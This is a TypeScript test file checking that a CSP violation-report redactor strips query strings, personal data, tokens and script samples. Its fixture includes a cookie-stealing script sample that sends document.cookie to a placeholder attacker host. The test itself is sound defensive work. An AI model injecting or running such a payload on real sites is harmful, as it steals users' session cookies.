import { describe, expect, it } from "vitest";

import { redactCspViolationReport } from "@/lib/security/csp-violation-redact";

describe("CSP violation redaction", () => {
  it("strips query strings and script samples from evidence", () => {
    const redacted = redactCspViolationReport({
      "csp-report": {
        "document-uri":
          "https://mapable.com.au/login?email=person@example.com&token=secret",
        "blocked-uri": "https://evil.example/x.js?key=abc",
        "violated-directive": "script-src",
        "script-sample":
          "fetch('https://evil.example?cookie='+document.cookie)",
        disposition: "enforce",
        "status-code": 0,
      },
    });

    expect(redacted.documentOrigin).toBe("https://mapable.com.au");
    expect(redacted.blockedUri).toBe("https://evil.example");
    expect(redacted.violatedDirective).toBe("script-src");
    expect(JSON.stringify(redacted)).not.toContain("person@example.com");
    expect(JSON.stringify(redacted)).not.toContain("document.cookie");
    expect(JSON.stringify(redacted)).not.toContain("token=secret");
  });
});
